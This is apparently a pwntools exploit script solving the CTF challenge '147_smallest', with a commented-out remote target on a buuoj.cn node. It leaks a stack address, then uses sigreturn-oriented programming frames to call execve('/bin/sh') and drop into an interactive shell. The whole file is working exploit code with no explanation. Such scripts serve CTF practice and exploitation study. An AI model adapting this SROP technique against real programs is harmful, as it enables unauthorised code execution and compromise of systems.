from pwn import *
from LibcSearcher import *
import time
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './147_smallest'
p=process(pwnfile)
#io=remote('node4.buuoj.cn',27201)
elf = ELF(pwnfile)
def pwn(addr): 
   ''' 
   addr should be writable address 
   ''' 
   # #sigreturn set RSP & RIP 
   ret_addr = 0x4000b0 # another read 
   syscall_addr = 0x4000be # only syscall 
   
   frame = SigreturnFrame() 
   frame.rsp = addr # any writable address(maybe in stack) 
   frame.rip = ret_addr 
   
   payload = p64(ret_addr) 
   payload += b'd' * 8 
   payload += bytes(frame)
   p.send(payload) 
   # second read, enter sysreturn 
   payload = p64(syscall_addr) 
   payload += b'\x11' * (15 - len(payload)) 
   p.send(payload) 
   yes = raw_input() 
   # #sigreturn execve 
   # another read now, to the choosed addr as rsp 
   frame2 = SigreturnFrame() 
   frame2.rsp = addr + 400 
   frame2.rax = constants.SYS_execve 
   frame2.rdi = addr + 400 
   frame2.rsi = addr + 400 + len("/bin/sh\x00") 
   frame2.rdx = 0  
   frame2.rip = syscall_addr 
 
   payload = p64(ret_addr) 
   payload += b'b' * 8 
   payload += bytes(frame2)
   payload += b'a' * (400 - len(payload)) 
   payload += b'/bin/sh\x00' 
   payload += p64(addr + 400) 
   p.send(payload) 
 
   yes = raw_input() 
   # another sigreturn 
   payload = p64(syscall_addr) 
   payload += b'\x00' * (0xf - len(payload)) 
   p.send(payload) 
  #get value of argv[0], a pointer to stack 
def leak(): 
   read_again = 0x4000b0 
   rdi_syscall_addr = 0x4000bb 
   payload = p64(read_again) 
   payload += p64(rdi_syscall_addr) 
   payload += p64(read_again) 
   p.send(payload) 
 
   yes = raw_input() 
 
   p.send(b'\xbb') 
   recved = p.recvuntil(b'\x7f') 
 
   then = p.recv() 
   leak = u64(recved[-6:] + then[:2]) 
   log.info("leaking:" + hex(leak)) 
   return leak 
 
 
def main(): 
   addr = leak() 
   addr = addr & 0xfffffffffffffff000 
   addr = addr - 0x2000 
   log.info("on addr: " + hex(addr)) 
   pwn(addr) 
   p.interactive() 
if __name__ == '__main__': 
   main() 
